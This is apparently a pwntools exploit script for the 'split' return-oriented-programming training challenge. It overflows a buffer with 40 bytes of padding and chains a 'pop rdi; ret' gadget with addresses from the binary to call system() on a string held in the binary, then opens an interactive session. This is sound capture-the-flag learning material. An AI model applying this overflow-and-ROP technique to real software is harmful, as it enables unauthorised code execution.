from pwn import *

e = ELF("split")
usefulStringAddr = e.symbols["usefulString"]

usefulFunctionAddr = e.symbols["usefulFunction"]
systemCallAddr = usefulFunctionAddr + 9 # the direct call of system() is at offset +9 of the function usefulFunction

popRdiAddr = 0x0000000000400883 # ROP gadget: pop rdi; ret

ropGadget = p64(popRdiAddr)
rdiContent = p64(usefulStringAddr)
systemCall = p64(systemCallAddr)

crap = "A"* 40

io = e.process()


io.sendline(crap + ropGadget + rdiContent + systemCall)
io.interactive()

